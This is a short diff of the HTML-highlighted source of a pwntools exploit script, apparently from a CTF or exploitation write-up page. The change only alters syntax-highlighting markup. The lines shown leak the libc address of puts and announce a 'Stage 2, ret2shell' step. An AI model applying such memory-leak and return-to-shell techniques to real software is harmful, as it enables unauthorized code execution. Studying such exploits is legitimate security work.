@@ -490,7 +490,7 @@ raw_data &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data[&lt;s
 
 leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; raw_data&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ljust(&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;b&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\x00&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#75715e&#34;&gt;# fill missing bytes with zeroes&lt;/span&gt;
 leaked_puts &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;u64(leaked_puts)
-pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(f&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leaked puts: {leaked_puts:x}&amp;#39;&lt;/span&gt;)
+pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;success(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Leaked puts: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;leaked_puts&lt;span style=&#34;color:#e6db74&#34;&gt;:&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
 
 
 pwn&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;info(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Stage 2, ret2shell&amp;#34;&lt;/span&gt;)
